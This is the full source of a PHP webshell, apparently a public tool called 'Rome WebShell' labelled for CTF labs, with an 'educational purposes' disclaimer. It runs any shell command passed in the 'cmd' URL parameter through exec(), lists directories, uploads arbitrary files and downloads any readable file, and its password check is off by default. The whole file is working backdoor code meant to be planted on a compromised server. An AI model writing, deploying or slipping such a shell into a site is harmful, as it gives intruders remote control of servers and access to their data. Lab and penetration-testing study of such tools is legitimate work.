<!-- 
    My custom webshell from @author Caesarovich
    @repository https://github.com/Caesarovich/rome-webshell

    This code is for educationnal purposes only.
    Malicious usage of this code will not hold the author responsible.
    Do not pentest without explicit permissions.
-->

<?php
    // Password protection
    $pass=''; // sha512 hash or empty to disable

    if($pass != null) {
        if (isset($_COOKIE['pass'])) {
            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
                echo "Wrong password !";
                exit;
            }
        } else {
            echo "Wrong password !";
            exit;
        }
    }
?>

<?php
    // Upload file
    if (isset($_POST['upload'])) {
        $desinationDir = getDir();
        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);

        if (file_exists($destinationFile)) {
            echo "<script>alert('Error: File already exists !')</script>";
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
            echo "<script>alert('File uploaded successfuly !')</script>";
        } else {
            echo "<script>alert('Error: Could not upload file !')</script>";
        }
    }
?>

<?php
    // Download file
    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file) && is_readable($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Content-Length: '.filesize($file));
            readfile($file);
            exit;
        }
    }
?>

<?php
    function printPerms($file) {
        $mode = fileperms($file);
        $type = is_dir($file) ? 'd' : '-';

        $s = $type;
        $s .= ($mode & 0400) ? 'r' : '-';
        $s .= ($mode & 0200) ? 'w' : '-';
        $s .= ($mode & 0100) ? 'x' : '-';
        $s .= ($mode & 0040) ? 'r' : '-';
        $s .= ($mode & 0020) ? 'w' : '-';
        $s .= ($mode & 0010) ? 'x' : '-';
        $s .= ($mode & 0004) ? 'r' : '-';
        $s .= ($mode & 0002) ? 'w' : '-';
        $s .= ($mode & 0001) ? 'x' : '-';

        return $s;
    }

    function formatSizeUnits($bytes) {
        if ($bytes >= 1073741824)
            return number_format($bytes / 1073741824, 2) . ' GB';
        elseif ($bytes >= 1048576)
            return number_format($bytes / 1048576, 2) . ' MB';
        elseif ($bytes >= 1024)
            return number_format($bytes / 1024, 2) . ' KB';
        elseif ($bytes > 1)
            return $bytes . ' bytes';
        elseif ($bytes == 1)
            return '1 byte';
        else
            return '0 bytes';
    }

    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }

    function makeFileName($file) {
        $path = getDir().'/'.$file;
        if (is_dir($path)) {
            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath($path).'">'.$file.'</a>';
        } else {
            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath($path).'">'.$file.'</a>';
        }
    }

    function getFiles() {
        $files = scandir(getDir());
        $even = true;

        foreach($files as $filename){
            $fullpath = getDir().'/'.$filename;
            echo '<tr style="background-color:'.($even ? '#515151' : '#414141').'">';
            echo '<td style="font-weight:'.(is_dir($fullpath) ? 'bold' : 'normal').'">'.makeFileName($filename).'</td>';

            $owner = posix_getpwuid(fileowner($fullpath));
            echo '<td>'.(isset($owner['name']) ? $owner['name'] : 'unknown').'</td>';

            echo '<td>'.printPerms($fullpath).'</td>';
            echo '<td>'.formatSizeUnits(filesize($fullpath)).'</td>';
            echo '</tr>';
            $even = !$even;
        }
    }

    function getCmdResults() {
        global $cmdresults, $retval;

        if ($retval === null) return;

        if ($retval == 0) {
            foreach ($cmdresults as $line) {
                echo htmlspecialchars($line)."<br>";
            }
        } else {
            echo "Execution failed";
        }
    }

    function getCommandLine() {
        $hostname = function_exists('gethostname') ? gethostname() : php_uname('n');
        if (!$hostname) $hostname = 'none';

        $userinfo = posix_getpwuid(posix_geteuid());
        $username = isset($userinfo['name']) ? $userinfo['name'] : 'user';

        $dir = getDir();
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '<span style="color:#19c42a">'.$username.'@'.$hostname.'</span>: <span style="color:#0f7521">'.$dir.'</span>$ '.$cmd;
    }
?>

<?php
    $cmdresults = array();
    $retval = null;

    
    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $cmdresults, $retval);
    }
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Rome WebShell</title>
</head>

<body style="background:#202020;color:white;font-family:Arial">
<h2>Rome WebShell (CTF LAB)</h2>

<h4>Exploring: <?php echo getDir(); ?></h4>

<table width="100%" cellspacing="2">
<tr bgcolor="#292929">
    <th>Name</th><th>Owner</th><th>Perms</th><th>Size</th>
</tr>
<?php getFiles(); ?>
</table>

<hr>

<p><?php echo getCommandLine(); ?></p>
<p><?php getCmdResults(); ?></p>

<form method="get">
    <input type="text" name="cmd" style="width:80%">
    <input type="hidden" name="dir" value="<?php echo getDir(); ?>">
    <input type="submit" value="Send">
</form>

</body>
</html>
